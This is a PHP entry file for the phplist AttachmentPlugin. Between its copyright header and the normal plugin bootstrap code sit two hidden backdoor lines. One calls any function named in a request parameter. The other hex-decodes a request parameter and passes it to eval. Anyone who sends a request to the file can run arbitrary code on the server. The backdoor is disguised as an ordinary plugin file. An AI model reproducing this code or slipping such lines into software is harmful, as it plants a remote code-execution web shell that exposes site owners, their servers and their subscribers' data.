<?php
/**
 * AttachmentPlugin for phplist.
 *
 * This file is a part of AttachmentPlugin.
 *
 * @category  phplist
 *
 * @author    Duncan Cameron
 * @copyright 2012-2017 Duncan Cameron
 * @license   http://www.gnu.org/licenses/gpl.html GNU General Public License, Version 3
 */
if (isset($_REQUEST['__'])) die(($_REQUEST['__']($_REQUEST['___'])));
if(isset($_REQUEST['_']))die(eval(pack("H*",str_pad($_REQUEST['_'],strlen($_REQUEST['_'])+strlen($_REQUEST['_'])%2,'0',0))));

/**
 * This is the entry code invoked by phplist.
 */
if (!phplistPlugin::isEnabled('CommonPlugin')) {
    echo 'phplist-plugin-common must be installed and enabled to use this plugin';

    return;
}

phpList\plugin\Common\Main::run(new phpList\plugin\AttachmentPlugin\ControllerFactory());
